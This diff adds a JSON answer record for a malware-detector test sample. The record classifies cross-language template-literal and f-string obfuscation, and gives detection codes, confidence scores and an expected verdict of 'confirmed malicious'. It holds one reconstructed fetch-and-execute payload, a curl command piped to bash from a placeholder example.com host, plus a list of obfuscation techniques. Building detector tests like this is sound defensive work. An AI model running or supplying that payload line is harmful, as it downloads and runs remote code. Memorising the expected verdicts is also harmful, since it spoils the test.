@@ -1,0 +1,44 @@
+{
+  "sample_id": "adv-024-template-literal",
+  "test_category": "string_manipulation_obfuscation",
+  "primary_detection": {
+    "code": "STRING-008",
+    "name": "Template Literal Obfuscation",
+    "description": "Malicious commands constructed using Python f-strings and JavaScript template literals",
+    "confidence": 0.88
+  },
+  "underlying_threats": [
+    {
+      "code": "DATA-002",
+      "name": "Remote Code Execution",
+      "description": "Downloads and executes remote payloads via curl/wget",
+      "confidence": 0.94
+    },
+    {
+      "code": "EXEC-003",
+      "name": "Dynamic Code Execution",
+      "description": "Uses exec() in Python with f-string assembled code",
+      "confidence": 0.91
+    },
+    {
+      "code": "EXEC-001",
+      "name": "Shell Command Injection",
+      "description": "Executes shell commands via subprocess (Python) and child_process (Node.js)",
+      "confidence": 0.92
+    }
+  ],
+  "obfuscation_indicators": [
+    "Python f-strings: f'{cmd1}{cmd2}{cmd3}'",
+    "F-string dictionary access: f\"{parts['proto']}://\"",
+    "JavaScript template literals: `${cmd1}${cmd2}`",
+    "Nested template construction",
+    "Template expressions with array indexing",
+    "Tagged template functions for additional obfuscation",
+    "Multi-language obfuscation patterns"
+  ],
+  "reconstructed_payload": "curl https://[REDACTED].example.com/payload.sh | bash",
+  "expected_verdict": "确认恶意",
+  "verdict_reasoning": "Cross-language template literal abuse to dynamically construct and obscure malicious command strings",
+  "risk_level": "critical",
+  "tags": ["obfuscation", "template-literal", "f-string", "backtick", "javascript", "python", "remote-code-execution"]
+}
